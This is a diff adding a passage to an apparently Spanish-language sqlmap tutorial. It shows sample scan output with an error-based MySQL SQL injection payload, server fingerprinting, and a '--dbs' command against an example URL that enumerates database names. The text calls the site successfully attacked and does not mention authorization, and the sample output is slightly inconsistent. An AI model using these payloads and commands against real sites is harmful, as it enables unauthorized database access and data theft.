@@ -364,12 +364,64 @@ Algo muy importante a tener en cuenta es que sqlmap escanea la página parametro
 
 Al empezar el escaneo, este de divide en partes:
 
-1 - Escaneará la coneccion con la página.
-2 - Escaneará la página en busca de algun WAF o IPS:
+Escaneará la coneccion con la página.
+Escaneará la página en busca de algun WAF o IPS:
 
 ` [INFO] checking if the target is protected by some kind of WAF/IPS` 
 
-3 -
+Al terminar el escaneo, nos aparecera algo como esto:
+
+```
+[*] starting at 12:10:33
+
+[12:10:33] [INFO] resuming back-end DBMS 'mysql' 
+[12:10:34] [INFO] testing connection to the target url
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=3 AND (SELECT 1489 FROM(SELECT COUNT(*),CONCAT(0x3a73776c3a,(SELECT (CASE WHEN (1489=1489) THEN 1 ELSE 0 END)),0x3a7a76653a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+---
+[12:10:37] [INFO] the back-end DBMS is MySQL
+web server operating system: FreeBSD
+web application technology: Apache 2.2.22
+back-end DBMS: MySQL 5
+
+```
+Esto significa que ya ha terminado el escaneo, que la página es vulnerable y que conseguimos atacarla con exito. Lo siguiente es extraer el nombre de la base de datos, para extraer el nombre de las bases de datos vamos a usar la opcion `--dbs`:
+
+
+`sqlmap.py -u "http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1" --dbs`
+
+Al terminar vamos a tener los nombres de las bases de datos, algo como esto:
+
+```
+[*] starting at 12:12:56
+
+[12:12:56] [INFO] resuming back-end DBMS 'mysql' 
+[12:12:57] [INFO] testing connection to the target url
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id3=1 AND (SELECT 1489 FROM(SELECT COUNT(*),CONCAT(0x3a73776c3a,(SELECT (CASE WHEN (1489=1489) THEN 1 ELSE 0 END)),0x3a7a76653a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+---
+[12:13:00] [INFO] the back-end DBMS is MySQL
+web server operating system: FreeBSD
+web application technology: Apache 2.2.22
+back-end DBMS: MySQL 5
+[12:13:00] [INFO] fetching database names
+[12:13:00] [INFO] the SQL query used returns 2 entries
+[12:13:00] [INFO] resumed: information_schema
+[12:13:00] [INFO] resumed: safecosmetics
+available databases [2]:
+[*] information_schema
+[*] nombre_DB
+```
 
 
 
